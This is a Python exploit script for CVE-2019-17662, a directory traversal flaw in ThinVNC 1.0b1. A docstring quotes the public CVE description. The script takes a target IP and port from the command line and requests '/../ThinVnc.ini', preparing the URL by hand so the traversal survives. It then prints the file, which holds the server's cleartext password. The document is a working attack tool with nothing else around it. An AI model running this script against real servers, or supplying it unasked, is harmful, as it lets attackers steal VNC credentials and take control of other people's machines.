#!/usr/bin/python3

'''
    CVE-2019-17662

    Exploit for ThinVNC (https://github.com/bewest/thinvnc)

    From cve.mitre.org: (https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-17662)
    >   ThinVNC 1.0b1 is vulnerable to arbitrary file read, which leads to a compromise of the VNC server. 
        The vulnerability exists even when authentication is turned on during the deployment of the VNC server. 
        The password for authentication is stored in cleartext in a file that can be read via a ../../ThinVnc.ini 
        directory traversal attack vector.
'''

import sys
import requests


def exploit(ip, port):
    targetFile = "/../ThinVnc.ini"
    url = "http://" + ip + ":" + port + targetFile

    # ../.. will be collapsed by requests by default.
    # Using prepare will prevent that
    #   https://github.com/psf/requests/issues/5289
    session = requests.Session()
    request = requests.Request(method='GET', url=url)
    prepared = request.prepare()
    prepared.url = url

    response = session.send(prepared, verify=False)

    print(response.text)


def main():
    # Parse Args
    if len(sys.argv) < 3:
        print("usage: exploit.py [IP] [PORT]")        
        return 1
    
    ip = sys.argv[1]
    port = sys.argv[2]

    exploit(ip, port)


if __name__ == '__main__':
    main()